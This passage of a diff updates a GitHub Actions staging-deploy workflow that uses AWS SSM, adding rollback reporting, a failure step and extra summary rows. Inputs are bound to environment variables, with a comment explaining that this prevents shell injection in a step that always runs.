+          aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" --query 'StandardErrorContent' --output text
+          echo "rollback-command-id=$CMD_ID" >> "$GITHUB_OUTPUT"
+
+      - name: Fail if unhealthy
+        if: steps.health.outcome == 'failure'
+        env:
+          APP_NAME: ${{ inputs.app-name }}
+          ROLLBACK_ON_FAILURE: ${{ inputs.rollback-on-failure }}
+        run: |
+          echo "::error::$APP_NAME did not become healthy. Rollback attempted: $ROLLBACK_ON_FAILURE."
           exit 1
 
       - name: Summary
         if: always()
+        # env-bound like every other step. This one matters MORE than it looks:
+        # `if: always()` means it runs even when the Validate step REJECTED the
+        # input. Interpolated directly, a payload that validation caught would
+        # still execute here, on the runner, after being refused.
         env:
           APP_NAME: ${{ inputs.app-name }}
           COMPOSE_FILES: ${{ inputs.compose-files }}
+          SYNC_FILES: ${{ inputs.sync-files }}
+          PULL_SERVICES: ${{ inputs.pull-services }}
         run: |
           {
             echo "### Staging deploy — $APP_NAME"
             echo ""
             echo "| | |"
             echo "|---|---|"
-            echo "| Host | \`${{ steps.host.outputs.instance-id }}\` |"
+            echo "| Host | \`${{ steps.host.outputs.instance-id }}\` (${{ steps.host.outputs.arch }}) |"
             echo "| Compose | \`$COMPOSE_FILES\` |"
+            echo "| Synced | \`$SYNC_FILES\` |"
+            echo "| Pulled | \`$PULL_SERVICES\` |"
             echo "| SSM command | \`${{ steps.deploy.outputs.command-id }}\` |"
+            echo "| Health | ${{ steps.health.outcome }} |"
+            echo "| Rolled back | ${{ steps.rollback.outcome }} |"
             echo "| Result | ${{ job.status }} |"
           } >> "$GITHUB_STEP_SUMMARY"
